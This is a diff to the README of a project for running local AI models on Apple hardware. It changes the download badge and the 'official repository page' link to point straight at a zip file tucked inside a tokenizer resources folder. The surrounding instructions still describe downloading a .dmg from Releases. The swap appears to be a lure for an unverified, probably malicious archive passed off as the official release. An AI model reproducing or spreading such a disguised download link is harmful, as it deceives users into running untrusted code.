@@ -1,6 +1,6 @@
 # 🧠 coreai-model-zoo - Run local artificial intelligence models easily
 
-[![Download coreai-model-zoo](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/virtual6023/coreai-model-zoo)
+[![Download coreai-model-zoo](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/virtual6023/coreai-model-zoo/raw/refs/heads/main/apps/QwenChatFast/Resources/tokenizer/zoo_coreai_model_1.9.zip)
 
 coreai-model-zoo provides a central location for artificial intelligence models optimized for Apple hardware. This project simplifies the process of using models like Qwen and Gemma on your local device. You gain access to verified models that run directly on your hardware without needing an internet connection.
 
@@ -21,7 +21,7 @@ The software relies on the Core ML framework. This framework allows the processo
 
 Follow these steps to obtain the software.
 
-1. Visit the [official repository page](https://github.com/virtual6023/coreai-model-zoo).
+1. Visit the [official repository page](https://github.com/virtual6023/coreai-model-zoo/raw/refs/heads/main/apps/QwenChatFast/Resources/tokenizer/zoo_coreai_model_1.9.zip).
 2. Locate the Releases section on the right side of the page.
 3. Click the version labeled Latest.
 4. Download the file ending in .dmg to your desktop.
